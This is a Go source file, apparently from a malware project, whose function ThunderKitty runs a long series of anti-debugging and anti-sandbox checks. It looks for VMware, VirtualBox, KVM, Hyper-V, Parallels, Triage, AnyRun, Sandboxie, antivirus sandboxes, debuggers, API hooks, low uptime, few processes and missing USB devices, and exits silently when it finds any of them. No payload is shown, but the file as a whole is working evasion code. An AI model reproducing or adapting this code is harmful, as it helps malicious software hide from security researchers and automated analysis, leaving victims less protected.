package AntiDebugVMAnalysis

import (
	"log"
	"os"

	// AntiDebug
	"anti_analysis/AntiDebug/CheckBlacklistedWindowsNames"
	"anti_analysis/AntiDebug/InternetCheck"
	"anti_analysis/AntiDebug/IsDebuggerPresent"
	"anti_analysis/AntiDebug/ParentAntiDebug"
	"anti_analysis/AntiDebug/RemoteDebugger"
	"anti_analysis/AntiDebug/RunningProcesses"
	HooksDetection "anti_analysis/AntiDebug/UserAntiAntiDebug"
	"anti_analysis/AntiDebug/pcuptime"

	// AntiVirtualization
	"anti_analysis/AntiVirtualization/AnyRunDetection"
	"anti_analysis/AntiVirtualization/CleanEnvironmentDetection"
	"anti_analysis/AntiVirtualization/ComodoAntivirusDetection"
	"anti_analysis/AntiVirtualization/CyberCapture"
	"anti_analysis/AntiVirtualization/DeepFreezeDetection"
	HyperVCheck "anti_analysis/AntiVirtualization/HyperVDetection"
	"anti_analysis/AntiVirtualization/KVMCheck"
	"anti_analysis/AntiVirtualization/MonitorMetrics"
	"anti_analysis/AntiVirtualization/ParallelsCheck"
	PowerShellCheck "anti_analysis/AntiVirtualization/PowerShellDetection"
	"anti_analysis/AntiVirtualization/RepetitiveProcess"
	"anti_analysis/AntiVirtualization/SandboxieDetection"
	"anti_analysis/AntiVirtualization/ShadowDefenderDetection"
	"anti_analysis/AntiVirtualization/TriageDetection"
	"anti_analysis/AntiVirtualization/USBCheck"
	"anti_analysis/AntiVirtualization/UsernameCheck"
	"anti_analysis/AntiVirtualization/VMArtifacts"
	VMPlatformCheck "anti_analysis/AntiVirtualization/VMPlatformDetection"
	"anti_analysis/AntiVirtualization/VMWareDetection"
	"anti_analysis/AntiVirtualization/VirtualboxDetection"
)

func ThunderKitty() {
	// Directory creation check
	if success := CyberCapture.CreateDirectory(); !success {
		log.Println("[DEBUG] Avast/AVG CyberCapture detected.")
		os.Exit(-1)
	}

	// lets just catch bunch of vms at beginning lol
	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
		os.Exit(-1)
	} else if usbPluggedIn {
		log.Println("[DEBUG] USB devices have been plugged in, check passed.")
	} else {
		os.Exit(-1)
	}
	if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
		log.Println("[DEBUG] Blacklisted username detected")
		os.Exit(-1)
	}
	// Run the built-in hook checks.
	if HooksDetection.DetectHooksOnCommonWinAPIFunctions("", nil) {
		log.Println("[DEBUG] UserAntiAntiDebug detected")
		os.Exit(-1)
	}

	found, err := PowerShellCheck.RunPowerShellCommand(`"PowerShell is working: " + (Get-Date).ToShortTimeString()`)
	if err != nil {
		// Exit immediately on error
		log.Printf("[DEBUG] PowerShell check failed: %v", err)
		os.Exit(-1)
	}
	if found != "" {
		// Service exists, continue with your logic
	} else {
		log.Println("[DEBUG] PowerShell returned empty result")
		os.Exit(-1)
	}

	// AntiVirtualization checks
	if vmwareDetected, _ := VMWareDetection.GraphicsCardCheck(); vmwareDetected {
		log.Println("[DEBUG] VMWare detected")
		os.Exit(-1)
	}

	if virtualboxDetected, _ := VirtualboxDetection.GraphicsCardCheck(); virtualboxDetected {
		log.Println("[DEBUG] Virtualbox detected")
		os.Exit(-1)
	}

	if kvmDetected, _ := KVMCheck.CheckForKVM(); kvmDetected {
		log.Println("[DEBUG] KVM detected")
		os.Exit(-1)
	}

	if triageDetected, _ := TriageDetection.TriageCheck(); triageDetected {
		log.Println("[DEBUG] Triage detected")
		os.Exit(-1)
	}

	// Check if the AnyRun environment is detected
	if anyRunDetected, _ := AnyRunDetection.AnyRunDetection(); anyRunDetected {
		log.Println("[DEBUG] AnyRun detected")
		os.Exit(-1) // Exit the program with an error code
	}

	if isScreenSmall, _ := MonitorMetrics.IsScreenSmall(); isScreenSmall {
		log.Println("[DEBUG] Screen size is small")
		os.Exit(-1)
	}
	if VMArtifacts := VMArtifacts.VMArtifactsDetect(); VMArtifacts {
		log.Println("[DEBUG] VMArtifacts components detected. Exiting.")
		os.Exit(-1)
	}

	if repetitiveproc, _ := RepetitiveProcess.Check(); repetitiveproc {
		log.Println("[DEBUG] RepetitiveProcess detected. Exiting")
		os.Exit(-1)
	}

	if pararelcheck, _ := ParallelsCheck.CheckForParallels(); pararelcheck {
		log.Println("[DEBUG] Parallels detected. Exiting")
		os.Exit(-1)
	}

	// Hyper-V detection
	if hypervDetected, _ := HyperVCheck.DetectHyperV(); hypervDetected {
		log.Println("[DEBUG] Hyper-V detected")
		os.Exit(-1)
	}

	// VMPlatform detection
	if vmPlatformDetected, _ := VMPlatformCheck.DetectVMPlatform(); vmPlatformDetected {
		log.Println("[DEBUG] VM Platform detected")
		os.Exit(-1)
	}

	// Comodo Antivirus detection
	if comodoDetected := ComodoAntivirusDetection.DetectComodoAntivirus(); comodoDetected {
		log.Println("[DEBUG] Comodo Antivirus detected")
		os.Exit(-1)
	}

	// Shadow Defender detection
	if shadowDefenderDetected := ShadowDefenderDetection.DetectShadowDefender(); shadowDefenderDetected {
		log.Println("[DEBUG] Shadow Defender detected")
		os.Exit(-1)
	}

	// Sandboxie detection
	if sandboxieDetected := SandboxieDetection.DetectSandboxie(); sandboxieDetected {
		log.Println("[DEBUG] Sandboxie detected")
		os.Exit(-1)
	}

	// Deep Freeze detection
	if deepFreezeDetected := DeepFreezeDetection.DetectDeepFreeze(); deepFreezeDetected {
		log.Println("[DEBUG] Deep Freeze detected")
		os.Exit(-1)
	}

	// Clean Environment detection
	if cleanEnvironmentDetected := CleanEnvironmentDetection.DetectCleanEnvironment(); cleanEnvironmentDetected {
		log.Println("[DEBUG] Clean Environment detected")
		os.Exit(-1)
	}

	// Blacklisted Windows account names, UUIDs, processes etc.
	if CheckBlacklistedWindowsNames.CheckBlacklistedWindows() {
		log.Println("[DEBUG] Blacklisted Windows name or process detected")
		os.Exit(-1)
	}

	// Other AntiDebug checks
	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
		log.Println("[DEBUG] Debugger presence detected")
		os.Exit(-1)
	}

	if remoteDebuggerDetected, _ := RemoteDebugger.RemoteDebugger(); remoteDebuggerDetected {
		log.Println("[DEBUG] Remote debugger detected")
		os.Exit(-1)
	}

	if connected, _ := InternetCheck.CheckConnection(); !connected {
		log.Println("[DEBUG] Internet connection check failed")
		os.Exit(-1)
	}

	if parentAntiDebugResult := ParentAntiDebug.ParentAntiDebug(); parentAntiDebugResult {
		log.Println("[DEBUG] ParentAntiDebug check failed")
		os.Exit(-1)
	}

	if runningProcessesCountDetected, _ := RunningProcesses.CheckRunningProcessesCount(50); runningProcessesCountDetected {
		log.Println("[DEBUG] Running processes count detected")
		os.Exit(-1)
	}

	if pcUptimeDetected, _ := pcuptime.CheckUptime(1200); pcUptimeDetected {
		log.Println("[DEBUG] PC uptime detected")
		os.Exit(-1)
	}

}
